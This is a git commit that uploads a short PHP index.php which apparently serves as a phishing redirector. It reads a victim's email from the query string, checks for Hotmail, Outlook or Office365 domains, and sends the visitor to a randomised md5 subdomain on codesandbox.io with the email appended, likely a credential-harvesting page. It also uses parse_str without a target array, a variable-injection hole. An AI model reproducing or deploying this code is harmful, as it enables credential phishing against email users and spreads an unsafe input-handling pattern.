74c58a75d81f13ec88e827add5e9a88a6baaca8f
fredander777 <93563472+fredander777@users.noreply.github.com>
2021-11-02 03:44:47 +0100

    Add files via upload

---
+++ index.php
@@ -0,0 +1,18 @@
+<?php 
+ $oslo=rand(); 
+ $praga=md5($oslo);
+ $url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+ parse_str(parse_url($url, PHP_URL_QUERY));
+ $domain = explode('@', $email);
+ 
+ $domain_check = '@'.strtolower($domain[1]);
+ 
+ if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
+  header('Location: https://'.$praga.'-h37r4.sse.codesandbox.io'.$email);
+ }
+ 
+ else {
+  header('Location: https://'.$praga.'-h37r4.sse.codesandbox.io'.$email);
+ }
+  
+?>
